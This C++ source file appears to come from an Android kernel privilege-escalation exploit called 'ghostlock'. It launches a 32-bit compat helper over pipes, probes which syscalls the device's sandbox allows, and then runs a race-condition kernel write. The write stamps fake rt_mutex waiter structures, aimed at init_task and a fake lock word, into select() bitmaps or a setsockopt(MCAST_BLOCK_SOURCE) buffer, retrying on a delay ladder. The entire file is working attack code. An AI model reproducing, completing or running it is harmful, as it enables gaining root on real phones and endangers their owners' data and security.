#include "route/compat_carrier.h"

#if defined(__ANDROID__)

#include "common.h"

#include "compat/carrier_protocol.h"
#include "memory/payload_builder.h"
#include "profile/accessors.hpp"
#include "route/compat_bitmap.h"
#include "route/lock_anchor.h"
#include "session/exploit_session.hpp"
#include "session/runtime_config.h"
#include "support/decls.hpp"

#include <array>
#include <cerrno>
#include <csignal>
#include <cstddef>
#include <cstdio>
#include <cstring>
#include <fcntl.h>
#include <poll.h>
#include <span>
#include <sys/wait.h>
#include <unistd.h>

using namespace ghostlock;

namespace {
    /* The helper must not share fd numbers with the route's 0..319 range. */
    constexpr int32_t kHelperFdBase = 400;
    constexpr int32_t kSmokeTimeoutMs = 30000;
    /* The compact-retry entry-delay ladder; the first attempt may use the
     * profile's seed instead. Shared by the select and multicast carriers. */
    constexpr std::array<uint32_t, 8> kCompatDelayLadder = {
        50000, 30000, 70000, 10000, 100000, 150000, 20000, 120000,
    };

    struct HelperProcess final {
        pid_t pid = -1;
        int32_t cmd_fd = -1;
        int32_t res_fd = -1;
    };

    int32_t resolve_helper_path(char *out, size_t capacity) noexcept {
        char exe[4096];
        const ssize_t length = readlink("/proc/self/exe", exe, sizeof(exe) - 1);
        if (length <= 0) return -errno;
        exe[length] = '\0';
        char *slash = strrchr(exe, '/');
        if (slash == nullptr) return -ENOENT;
        *slash = '\0';
        const int written = snprintf(out, capacity, "%s/libghostlock32.so", exe);
        if (written <= 0 || static_cast<size_t>(written) >= capacity) {
            return -ENAMETOOLONG;
        }
        return 0;
    }

    bool write_all(int32_t fd, const void *data, size_t length) noexcept {
        const auto *bytes = static_cast<const uint8_t *>(data);
        size_t done = 0;
        while (done < length) {
            const ssize_t put = write(fd, bytes + done, length - done);
            if (put < 0) {
                if (errno == EINTR) continue;
                return false;
            }
            done += static_cast<size_t>(put);
        }
        return true;
    }

    bool read_all(int32_t fd, void *data, size_t length, int32_t timeout_ms) noexcept {
        auto *bytes = static_cast<uint8_t *>(data);
        size_t done = 0;
        while (done < length) {
            struct pollfd poll_fd{};
            poll_fd.fd = fd;
            poll_fd.events = POLLIN;
            const int ready = poll(&poll_fd, 1, timeout_ms);
            if (ready <= 0) return false;
            const ssize_t got = read(fd, bytes + done, length - done);
            if (got < 0) {
                if (errno == EINTR) continue;
                return false;
            }
            if (got == 0) return false;
            done += static_cast<size_t>(got);
        }
        return true;
    }

    bool spawn_helper(const char *path, HelperProcess *helper, int32_t *error) noexcept {
        int32_t cmd_pipe[2] = {-1, -1};
        int32_t res_pipe[2] = {-1, -1};
        if (pipe2(cmd_pipe, O_CLOEXEC) != 0) {
            *error = errno;
            return false;
        }
        if (pipe2(res_pipe, O_CLOEXEC) != 0) {
            *error = errno;
            close(cmd_pipe[0]);
            close(cmd_pipe[1]);
            return false;
        }
        const pid_t pid = fork();
        if (pid < 0) {
            *error = errno;
            close(cmd_pipe[0]);
            close(cmd_pipe[1]);
            close(res_pipe[0]);
            close(res_pipe[1]);
            return false;
        }
        if (pid == 0) {
            /* Child: keep the run log on fd 1; move the protocol ends above
             * the route's fd range and clear CLOEXEC so they survive execl. */
            const int32_t cmd_in = fcntl(cmd_pipe[0], F_DUPFD, kHelperFdBase);
            const int32_t res_out = fcntl(res_pipe[1], F_DUPFD, kHelperFdBase + 1);
            if (cmd_in < kHelperFdBase || res_out < kHelperFdBase) _exit(127);
            (void) fcntl(cmd_in, F_SETFD, 0);
            (void) fcntl(res_out, F_SETFD, 0);
            /* The originals are low fds the route would clobber; the copies
             * above 400 are the ones the helper uses. */
            close(cmd_pipe[0]);
            close(cmd_pipe[1]);
            close(res_pipe[0]);
            close(res_pipe[1]);
            char cmd_arg[32];
            char res_arg[32];
            snprintf(cmd_arg, sizeof(cmd_arg), "--cmd-fd=%d", cmd_in);
            snprintf(res_arg, sizeof(res_arg), "--res-fd=%d", res_out);
            execl(path, path, cmd_arg, res_arg, static_cast<char *>(nullptr));
            _exit(127);
        }
        close(cmd_pipe[0]);
        close(res_pipe[1]);
        helper->pid = pid;
        helper->cmd_fd = cmd_pipe[1];
        helper->res_fd = res_pipe[0];
        return true;
    }

    /* Run one helper command and always reap the child. */
    bool run_helper(const char *path, const ::ghostlock::compat::CarrierCommand &command,
                    int32_t timeout_ms, ::ghostlock::compat::CarrierResult *result,
                    int32_t *helper_exit, int32_t *helper_signal,
                    int32_t *error) noexcept {
        *helper_exit = -1;
        *helper_signal = 0;
        *error = 0;
        HelperProcess helper{};
        if (!spawn_helper(path, &helper, error)) {
            pr_warning("compat helper: spawn failed path=%s errno=%d\n", path, *error);
            return false;
        }
        bool ok = write_all(helper.cmd_fd, &command, sizeof(command));
        if (!ok) {
            *error = errno;
            pr_warning("compat helper: command write failed errno=%d\n", *error);
        } else {
            ok = read_all(helper.res_fd, result, sizeof(*result), timeout_ms);
            if (!ok) {
                *error = ETIMEDOUT;
                pr_warning("compat helper: no result within %d ms\n", timeout_ms);
                (void) kill(helper.pid, SIGKILL);
            }
        }
        close(helper.cmd_fd);
        close(helper.res_fd);
        int32_t status = 0;
        const pid_t reaped = waitpid(helper.pid, &status, 0);
        if (reaped == helper.pid) {
            if (WIFEXITED(status)) {
                *helper_exit = WEXITSTATUS(status);
            } else if (WIFSIGNALED(status)) {
                *helper_signal = WTERMSIG(status);
            }
        }
        if (ok && (result->magic != compat::kResultMagic ||
                   result->version != compat::kProtocolVersion)) {
            *error = EBADMSG;
            pr_warning("compat helper: bad result magic=0x%08x version=%u\n",
                       result->magic, result->version);
            ok = false;
        }
        return ok;
    }

    bool smoke_once(const ::ghostlock::compat::CarrierFutexAbi abi) noexcept {
        static bool probed = false;
        static bool probe_ok = false;
        if (probed) return probe_ok;
        probed = true;

        char path[4096];
        int32_t error = 0;
        if (resolve_helper_path(path, sizeof(path)) != 0) {
            pr_error("compat helper: cannot resolve /proc/self/exe\n");
            return false;
        }
        const auto &exploit_session = session::g_exploit_session;
        ::ghostlock::compat::CarrierCommand command;
        command.mode = static_cast<uint32_t>(::ghostlock::compat::CarrierMode::Smoke);
        command.futex_abi = static_cast<uint32_t>(abi);
        command.nfds = ::ghostlock::compat::kCarrierNfds;
        command.bitmap_bytes = ::ghostlock::compat::kCarrierBitmapBytes;
        command.select_timeout_us = exploit_session.profile.select_timeout_us();
        command.delay_us = exploit_session.profile.select_enter_delay_us();
        command.consumer_max_calls = exploit_session.profile.select_consumer_max_calls();
        command.consumer_burst_calls = exploit_session.profile.select_consumer_burst_calls();
        command.waiter_cpu = static_cast<uint32_t>(config::runtime_config_snapshot().main_cpu);
        command.consumer_cpu = static_cast<uint32_t>(config::runtime_config_snapshot().consumer_cpu);
        command.route_wait_ms = exploit_session.profile.race_route_wait_ms();
        command.state_poll_us = exploit_session.profile.race_state_poll_interval_us();
        command.route_done_timeout_ms = exploit_session.profile.race_route_done_timeout_ms();

        ::ghostlock::compat::CarrierResult result;
        int32_t helper_exit = -1;
        int32_t helper_signal = 0;
        const bool completed = run_helper(path, command, kSmokeTimeoutMs,
                                          &result, &helper_exit, &helper_signal,
                                          &error);
        if (!completed) {
            pr_error("compat helper smoke: delivery failed path=%s exit=%d signal=%d errno=%d\n",
                     path, helper_exit, helper_signal, error);
            return false;
        }
        pr_info("compat helper smoke: exit=%d signal=%d futex=%d timerfd=%d "
                "newselect=%d sched_setattr=%d pipe2=%d fcntl_high=%d dup2_319=%d prctl=%d "
                "futex_time64=%d socket=%d setsockopt=%d\n",
                helper_exit, helper_signal, result.smoke[0], result.smoke[1],
                result.smoke[2], result.smoke[3], result.smoke[5], result.smoke[6],
                result.smoke[4], result.smoke[7], result.smoke[8], result.smoke[9],
                result.smoke[10]);
        bool all_zero = result.status == 0;
        for (int i = 0; i < 11; i++) {
            if (result.smoke[i] != 0) all_zero = false;
        }
        probe_ok = helper_exit == 0 && helper_signal == 0 && all_zero;
        if (!probe_ok) {
            pr_error("compat helper smoke: a required syscall is refused; the "
                     "carrier cannot run in this domain\n");
        } else {
            pr_info("compat helper smoke: delivery and syscall surface OK\n");
        }
        return probe_ok;
    }

    /* The compat multicast variant: the same helper and anchor flow as the
     * select carrier, but the waiter's park is setsockopt(MCAST_BLOCK_SOURCE)
     * with the native-built 0x104-byte compat group_source_req. One helper
     * invocation per attempt; the native owns every kernel address and the
     * stamp, the helper only calls setsockopt. */
    bool run_multicast_carrier(const profile::TargetProfile &target,
                               const profile::MulticastWaiterLayout &layout,
                               const char *helper_path) noexcept {
        const uint32_t stamp_bytes = layout.compat_buffer_size.value_or(0);
        const int32_t waiter_off = layout.compat_waiter_off.value_or(-1);
        const uint32_t task_offset = layout.task_offset.value_or(0);
        const uint32_t lock_offset = layout.lock_offset.value_or(0);
        const uint32_t abi = layout.compat_futex_abi.value_or(0);
        if (stamp_bytes < memory::kWaiterBytes ||
            stamp_bytes > ::ghostlock::compat::kCarrierStampBytes ||
            waiter_off < 0 ||
            static_cast<uint32_t>(waiter_off) + memory::kWaiterBytes > stamp_bytes ||
            static_cast<uint32_t>(waiter_off) + lock_offset + 8 > stamp_bytes ||
            task_offset == 0 || lock_offset == 0 || abi > 1) {
            pr_error("compat multicast: geometry invalid off=%d buffer=%u task=%u "
                     "lock=%u abi=%u\n",
                     waiter_off, stamp_bytes, task_offset, lock_offset, abi);
            return false;
        }
        const int32_t attempts = 4;
        for (int32_t attempt = 1; attempt <= attempts; attempt++) {
            uintptr_t lock_word = session::g_exploit_session.heap.current.fake_lock;
            uintptr_t slot = 0;
            if (const auto anchor_image = layout.lock_anchor_image) {
                const uintptr_t anchored = route::anchor::acquire_lock_word(
                    *anchor_image, layout.lock_anchor_bytes,
                    layout.lock_anchor_stride, attempt, &slot);
                if (anchored == 0) {
                    pr_warning("compat multicast: anchor slots exhausted attempt=%d\n",
                               attempt);
                    return false;
                }
                lock_word = anchored;
            }
            if (lock_word == 0) {
                pr_warning("compat multicast: no lock word (no anchor and no page)\n");
                return false;
            }
            const memory::PayloadWriteLayout stamp_layout = {
                .parent = session::g_exploit_session.heap.current.fake_parent,
                .right = session::g_exploit_session.heap.current.fake_right,
                .left = session::g_exploit_session.heap.current.fake_left,
            };
            const memory::WaiterWords words = memory::waiter_words(
                stamp_layout, ghostlock::profile::slide_init_task(), lock_word,
                kernel::waiter_prio_word(
                    kernel::FAKE_WAITER_PRIO,
                    target.compact_waiter_has_wake_state()));
            ::ghostlock::compat::CarrierCommand command;
            command.mode =
                static_cast<uint32_t>(::ghostlock::compat::CarrierMode::Multicast);
            command.futex_abi = abi;
            command.option = 43U; /* MCAST_BLOCK_SOURCE */
            command.stamp_bytes = stamp_bytes;
            command.nfds = ::ghostlock::compat::kCarrierNfds;
            command.bitmap_bytes = ::ghostlock::compat::kCarrierBitmapBytes;
            command.select_timeout_us = 0;
            command.delay_us = attempt == 1 && target.select_enter_delay_us() != 0
                                   ? target.select_enter_delay_us()
                                   : kCompatDelayLadder[static_cast<size_t>((attempt - 1) % 8)];
            command.consumer_max_calls = target.select_consumer_max_calls();
            command.consumer_burst_calls = target.select_consumer_burst_calls();
            command.waiter_cpu = static_cast<uint32_t>(
                config::runtime_config_snapshot().main_cpu);
            command.consumer_cpu = static_cast<uint32_t>(
                config::runtime_config_snapshot().consumer_cpu);
            command.route_wait_ms = target.race_route_wait_ms();
            command.state_poll_us = target.race_state_poll_interval_us();
            command.route_done_timeout_ms = target.race_route_done_timeout_ms();
            command.setup_settle_us = target.race_setup_settle_us();
            std::memset(command.stamp, 0, sizeof(command.stamp));
            if (!memory::encode_waiter_words(
                    std::span<std::byte>(
                        reinterpret_cast<std::byte *>(command.stamp), stamp_bytes),
                    static_cast<size_t>(waiter_off), words)) {
                pr_error("compat multicast: stamp does not fit off=%d buffer=%u\n",
                         waiter_off, stamp_bytes);
                return false;
            }
            int32_t timeout_ms = 600000;
            if (target.race_route_done_timeout_ms() < 570000U) {
                timeout_ms = static_cast<int32_t>(
                    target.race_route_done_timeout_ms() + 30000U);
            }
            ::ghostlock::compat::CarrierResult result;
            int32_t helper_exit = -1;
            int32_t helper_signal = 0;
            int32_t delivery_error = 0;
            if (!run_helper(helper_path, command, timeout_ms, &result, &helper_exit,
                            &helper_signal, &delivery_error)) {
                pr_warning("compat multicast attempt=%d/%d delivery failed exit=%d "
                           "signal=%d errno=%d\n",
                           attempt, attempts, helper_exit, helper_signal,
                           delivery_error);
                return false;
            }
            pr_info("compat multicast attempt=%d/%d status=%u step=%d err=%d "
                    "route=%d errno=%d calls=%d success=%d drain=%d clean=%u/%u "
                    "slot=%llu lock=%016llx\n",
                    attempt, attempts, result.status, result.step,
                    result.error_number, result.route_result, result.route_errno,
                    result.calls, result.successes, result.drain_ms,
                    result.userspace_clean, result.kernel_disarmed,
                    static_cast<unsigned long long>(slot),
                    static_cast<unsigned long long>(lock_word));
            if (result.status == 3U) { /* RouteResultCode::DirtyFailure */
                pr_error("compat multicast: dirty attempt=%d; stopping the run\n",
                         attempt);
                support::fail_stop_dirty_race("compat multicast", result.step);
            }
            if (result.status == 0U) { /* RouteResultCode::Ok */
                return true;
            }
        }
        pr_warning("compat multicast: all %d attempt(s) failed\n", attempts);
        return false;
    }
} // namespace

namespace ghostlock::route::compat {
    bool carrier_requested() noexcept {
        const auto &profile = session::g_exploit_session.profile;
        if (!profile.loaded()) return false;
        return profile.select_stack_layout().compat_carrier.value_or(0) != 0 ||
               profile.multicast_layout().compat_carrier.value_or(0) != 0;
    }

    bool run_compat_carrier(const memory::WriteRequest &request) {
        (void) request;
        /* The helper can die before reading its command (a refused syscall at
         * startup); a write to its pipe must report EPIPE, not kill us. */
        (void) signal(SIGPIPE, SIG_IGN);
        const auto &exploit_session = session::g_exploit_session;
        const auto select_layout = exploit_session.profile.select_stack_layout();
        const auto multicast_layout = exploit_session.profile.multicast_layout();
        const bool select_requested = select_layout.compat_carrier.value_or(0) != 0;
        const bool multicast_requested = multicast_layout.compat_carrier.value_or(0) != 0;
        if (!select_requested && !multicast_requested) {
            pr_warning("compat carrier: profile did not request it\n");
            return false;
        }
        /* Delivery and the syscall surface are kernel-geometry independent, so
         * they are probed first: on a non-fitting kernel (the 236 rig) this is
         * still a valid G2 probe -- extraction, exec, SELinux and the ARM
         * seccomp branch -- before the geometry refusal below. */
        if (!smoke_once(::ghostlock::compat::CarrierFutexAbi::Time32)) {
            return false;
        }
        char path[4096];
        if (resolve_helper_path(path, sizeof(path)) != 0) {
            pr_error("compat carrier: cannot resolve the helper path\n");
            return false;
        }
        if (multicast_requested) {
            return run_multicast_carrier(exploit_session.profile, multicast_layout,
                                         path);
        }
        const auto &layout = select_layout;
        if (!layout.waiter_home.has_value() || !layout.select_dst_depth.has_value()) {
            pr_warning("compat carrier: geometry missing (waiter_home/select_dst_depth)\n");
            return false;
        }
        const BitmapGeometry geometry{
            .waiter_home = *layout.waiter_home,
            .select_dst_depth = *layout.select_dst_depth,
        };
        BitmapPlan plan{};
        BitmapFitError fit = BitmapFitError::None;
        if (!plan_compat_bitmap(geometry, &plan, &fit)) {
            pr_error("compat carrier: geometry refused home=0x%x dst=0x%x fit=%d\n",
                     geometry.waiter_home, geometry.select_dst_depth,
                     static_cast<int32_t>(fit));
            return false;
        }
        pr_info("compat carrier: geometry home=0x%x dst=0x%x offset=0x%x words=%u "
                "abi=%u zero_tail=%d\n",
                geometry.waiter_home, geometry.select_dst_depth, plan.offset,
                plan.words, static_cast<uint32_t>(plan.futex_abi),
                plan.zero_tail ? 1 : 0);

        const auto &profile = exploit_session.profile;
        const int32_t attempts = layout.compact_waiter.value_or(0) ? 4 : 1;
        for (int32_t attempt = 1; attempt <= attempts; attempt++) {
            uintptr_t lock_word = session::g_exploit_session.heap.current.fake_lock;
            uintptr_t slot = 0;
            if (const auto anchor_image = layout.lock_anchor_image) {
                const uintptr_t anchored = anchor::acquire_lock_word(
                    *anchor_image, layout.lock_anchor_bytes,
                    layout.lock_anchor_stride, attempt, &slot);
                if (anchored == 0) {
                    pr_warning("compat carrier: anchor slots exhausted attempt=%d\n",
                               attempt);
                    return false;
                }
                lock_word = anchored;
            }
            if (lock_word == 0) {
                pr_warning("compat carrier: no lock word (no anchor and no page)\n");
                return false;
            }
            const memory::PayloadWriteLayout stamp_layout = {
                .parent = session::g_exploit_session.heap.current.fake_parent,
                .right = session::g_exploit_session.heap.current.fake_right,
                .left = session::g_exploit_session.heap.current.fake_left,
            };
            const memory::WaiterWords words = memory::waiter_words(
                stamp_layout, ghostlock::profile::slide_init_task(), lock_word,
                kernel::waiter_prio_word(kernel::FAKE_WAITER_PRIO,
                                         profile.compact_waiter_has_wake_state()));
            ::ghostlock::compat::CarrierCommand command;
            command.mode = static_cast<uint32_t>(::ghostlock::compat::CarrierMode::Run);
            command.futex_abi = static_cast<uint32_t>(plan.futex_abi);
            command.nfds = ::ghostlock::compat::kCarrierNfds;
            command.bitmap_bytes = ::ghostlock::compat::kCarrierBitmapBytes;
            command.select_timeout_us = profile.select_timeout_us();
            command.delay_us = attempt == 1 && profile.select_enter_delay_us() != 0
                                   ? profile.select_enter_delay_us()
                                   : kCompatDelayLadder[static_cast<size_t>((attempt - 1) % 8)];
            command.consumer_max_calls = profile.select_consumer_max_calls();
            command.consumer_burst_calls = profile.select_consumer_burst_calls();
            command.waiter_cpu = static_cast<uint32_t>(
                config::runtime_config_snapshot().main_cpu);
            command.consumer_cpu = static_cast<uint32_t>(
                config::runtime_config_snapshot().consumer_cpu);
            command.route_wait_ms = profile.race_route_wait_ms();
            command.state_poll_us = profile.race_state_poll_interval_us();
            command.route_done_timeout_ms = profile.race_route_done_timeout_ms();
            command.setup_settle_us = profile.race_setup_settle_us();
            BitmapPlan attempt_plan{};
            BitmapFitError fit = BitmapFitError::None;
            if (!pack_compat_bitmap(
                    words, geometry,
                    std::span<uint8_t>(command.bitmap,
                                       ::ghostlock::compat::kCarrierBitmapBytes),
                    &attempt_plan, &fit)) {
                pr_error("compat carrier: bitmap refused attempt=%d fit=%d\n",
                         attempt, static_cast<int32_t>(fit));
                return false;
            }
            int32_t timeout_ms = 600000;
            if (profile.race_route_done_timeout_ms() < 570000U) {
                timeout_ms = static_cast<int32_t>(
                    profile.race_route_done_timeout_ms() + 30000U);
            }
            ::ghostlock::compat::CarrierResult result;
            int32_t helper_exit = -1;
            int32_t helper_signal = 0;
            int32_t delivery_error = 0;
            const bool completed = run_helper(
                path, command, timeout_ms, &result, &helper_exit,
                &helper_signal, &delivery_error);
            if (!completed) {
                pr_warning("compat route attempt=%d/%d delivery failed exit=%d "
                           "signal=%d errno=%d\n",
                           attempt, attempts, helper_exit, helper_signal,
                           delivery_error);
                return false;
            }
            pr_info("compat route attempt=%d/%d calls=%d success=%d select=%d "
                    "errno=%d drain=%d status=%u clean=%u/%u slot=%llu "
                    "lock=%016llx\n",
                    attempt, attempts, result.calls, result.successes,
                    result.select_result, result.select_errno, result.drain_ms,
                    result.status, result.userspace_clean,
                    result.kernel_disarmed,
                    static_cast<unsigned long long>(slot),
                    static_cast<unsigned long long>(lock_word));
            if (result.status == 3U) { /* RouteResultCode::DirtyFailure */
                pr_error("compat carrier: dirty attempt=%d; stopping the run\n",
                         attempt);
                support::fail_stop_dirty_race("compat carrier", result.step);
            }
            if (result.status == 0U) { /* RouteResultCode::Ok */
                return true;
            }
        }
        pr_warning("compat carrier: all %d attempt(s) failed\n", attempts);
        return false;
    }
} // namespace ghostlock::route::compat

#endif // __ANDROID__
